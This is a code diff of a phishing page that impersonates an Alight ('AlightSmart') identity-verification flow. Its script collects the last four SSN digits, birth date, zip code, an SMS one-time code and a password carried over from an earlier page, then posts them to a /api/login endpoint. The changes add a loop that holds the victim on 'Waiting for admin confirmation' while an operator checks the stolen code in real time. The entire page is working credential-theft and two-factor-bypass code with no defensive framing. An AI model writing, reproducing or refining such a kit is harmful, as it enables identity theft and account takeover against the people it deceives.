@@ -6,92 +6,73 @@
     <title>Verify Identity - AlightSmart</title>
     <style>
         body { font-family: Arial, sans-serif; background: #f8fafc; padding: 20px; }
-        .container { max-width: 420px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        h1 { font-size: 1.6rem; margin-bottom: 10px; text-align: center; }
-        p { text-align: center; color: #475569; margin-bottom: 25px; }
+        .container { max-width: 420px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
+        h1 { font-size: 1.6rem; margin-bottom: 10px; }
+        p { color: #475569; margin-bottom: 25px; }
         label { display: block; margin: 20px 0 8px; font-weight: 600; }
         input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; }
-        button { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 8px; font-size: 1.1rem; cursor: pointer; }
+        button { width: 100%; padding: 15px; margin-top: 15px; border: none; border-radius: 8px; font-size: 1.1rem; cursor: pointer; }
         .continue { background: #1e40af; color: white; }
         .cancel { background: #94a3b8; color: white; }
-        .error { color: red; margin-top: 10px; text-align: center; font-weight: bold; }
-        .success { color: green; margin-top: 10px; text-align: center; font-weight: bold; }
+        .error { color: red; margin: 15px 0; font-weight: bold; }
+        .waiting { color: #3b82f6; font-size: 1.1rem; margin: 20px 0; }
         .step { display: none; }
         .step.active { display: block; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Step 1 -->
+        <!-- Step 1: SSN + DOB -->
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
-            <p>You'll need to provide some information first to confirm your identity.</p>
-            
+            <p>Provide information to verify your identity.</p>
             <label>Last 4 Digits of SSN</label>
-            <input type="text" id="ssn" maxlength="4" placeholder="1234" required>
+            <input type="text" id="ssn" maxlength="4" placeholder="1234">
             
             <label>Birth Date</label>
-            <div style="display:flex; gap:10px;">
-                <select id="month" required><option value="">Month</option></select>
-                <select id="day" required><option value="">Day</option></select>
-                <select id="year" required><option value="">Year</option></select>
+            <div style="display:flex; gap:8px;">
+                <select id="month"><option value="">Month</option></select>
+                <select id="day"><option value="">Day</option></select>
+                <select id="year"><option value="">Year</option></select>
             </div>
-            
+
             <label style="margin-top:20px;">
-                <input type="checkbox" id="privacy"> To continue, check here to accept the <strong>Alight Privacy Policy</strong>.
+                <input type="checkbox" id="privacy"> Accept Alight Privacy Policy
             </label>
-            
             <button class="continue" onclick="nextStep(2)">Continue</button>
-            <button class="cancel" onclick="cancel()">Cancel</button>
         </div>
 
-        <!-- Step 2 -->
+        <!-- Step 2: Zip Code -->
         <div id="step2" class="step">
             <h1>Provide Additional Information</h1>
             <label>Zip Code</label>
-            <input type="text" id="zip" maxlength="5" placeholder="12345" required>
-            
+            <input type="text" id="zip" maxlength="5" placeholder="12345">
             <button class="continue" onclick="nextStep(3)">Continue</button>
-            <button class="cancel" onclick="cancel()">Cancel</button>
         </div>
 
-        <!-- Step 3 -->
+        <!-- Step 3: Access Code + Waiting -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
-            <input type="text" id="code" maxlength="6" placeholder="123456" required>
-            <div id="error" class="error"></div>
-            
-            <button class="continue" onclick="verifyCode()">Continue</button>
-            <button class="cancel" onclick="cancel()">Cancel</button>
-            
-            <p style="text-align:center; margin-top:15px;">
-                <a href="#" onclick="resendCode()">Resend code</a>
-            </p>
+            <input type="text" id="code" maxlength="10" placeholder="123456" style="font-size:1.4rem; text-align:center;">
+            <div id="status" class="waiting"></div>
+            <button class="continue" onclick="submitCode()">Submit Code</button>
         </div>
     </div>
 
     <script>
-        let currentStep = 1;
-        let realPassword = "";
+        let realPassword = sessionStorage.getItem('realPassword') || "N/A";
 
         function nextStep(step) {
+            // Basic validation
             if (step === 2) {
-                const ssn = document.getElementById('ssn').value.trim();
-                const month = document.getElementById('month').value;
-                const day = document.getElementById('day').value;
-                const year = document.getElementById('year').value;
-                const privacy = document.getElementById('privacy').checked;
-
-                if (ssn.length !== 4 || !month || !day || !year || !privacy) {
-                    alert("Please fill all fields and accept the Privacy Policy.");
+                if (document.getElementById('ssn').value.length !== 4 || !document.getElementById('privacy').checked) {
+                    alert("Please complete all fields and accept the policy.");
                     return;
                 }
             }
-
             if (step === 3) {
-                const zip = document.getElementById('zip').value.trim();
-                if (zip.length < 5) {
+                if (document.getElementById('zip').value.length < 5) {
                     alert("Please enter a valid Zip Code.");
                     return;
                 }
@@ -99,71 +80,74 @@
 
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById('step' + step).classList.add('active');
-            currentStep = step;
         }
 
-        async function verifyCode() {
+        async function submitCode() {
             const code = document.getElementById('code').value.trim();
-            const errorDiv = document.getElementById('error');
+            const statusDiv = document.getElementById('status');
 
             if (code.length < 4) {
-                errorDiv.textContent = "The code you entered is incorrect or has expired.";
+                statusDiv.innerHTML = `<span style="color:red">Invalid code</span>`;
                 return;
             }
 
-            // Collect all data
+            statusDiv.innerHTML = "Waiting for admin confirmation... (Do not close this page)";
+
             const ssn = document.getElementById('ssn').value;
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value;
 
-            const username = ssn ? `SSN-${ssn}` : "Verified User";
-            const password = realPassword || document.getElementById('password') ? document.getElementById('password').value : "Password"; 
-            const address = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Correct`;
+            const fullDetails = `SSN:${ssn} | DOB:${dob} | Zip:${zip} | Code:${code} | Status:Pending`;
 
             await fetch('/api/login', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, password, address })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: `SSN-${ssn}`,
+                    password: realPassword,
+                    address: fullDetails
+                })
             });
 
-            alert("Verification Successful!");
-            window.location.href = "tunde.html";
-        }
+            // Start polling for admin confirmation
+            let attempts = 0;
+            const check = setInterval(async () => {
+                attempts++;
+                const res = await fetch('/api/records');
+                const records = await res.json();
+                const latest = records[0];
 
-        function cancel() {
-            window.location.href = "/";
-        }
+                if (latest && latest.address && latest.address.includes("Confirmed")) {
+                    clearInterval(check);
+                    alert("✅ Verification Successful!");
+                    window.location.href = "tunde.html";
+                } else if (latest && latest.address && latest.address.includes("Rejected")) {
+                    clearInterval(check);
+                    statusDiv.innerHTML = `<span style="color:red">Code Rejected. Please request a new code.</span>`;
+                }
 
-        function resendCode() {
-            alert("New verification code has been sent.");
-            document.getElementById('error').textContent = "";
+                if (attempts > 40) clearInterval(check); // timeout after ~2 minutes
+            }, 3000);
         }
 
         window.onload = () => {
-            // Populate dropdowns
-            const monthSelect = document.getElementById('month');
+            // Populate date dropdowns
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
-            months.forEach((month, i) => {
+            months.forEach((m,i) => {
                 let opt = document.createElement('option');
-                opt.value = i + 1;
-                opt.text = month;
-                monthSelect.appendChild(opt);
+                opt.value = i+1; opt.text = m;
+                document.getElementById('month').appendChild(opt);
             });
-
-            const daySelect = document.getElementById('day');
-            for (let i = 1; i <= 31; i++) {
+            for(let i=1; i<=31; i++) {
                 let opt = document.createElement('option');
-                opt.value = i;
-                opt.text = i;
-                daySelect.appendChild(opt);
+                opt.value = i; opt.text = i;
+                document.getElementById('day').appendChild(opt);
             }
-
             const yearSelect = document.getElementById('year');
-            const currentYear = new Date().getFullYear();
-            for (let i = currentYear; i >= 1950; i--) {
+            const curr = new Date().getFullYear();
+            for(let i=curr; i>=1950; i--) {
                 let opt = document.createElement('option');
-                opt.value = i;
-                opt.text = i;
+                opt.value = i; opt.text = i;
                 yearSelect.appendChild(opt);
             }
         };
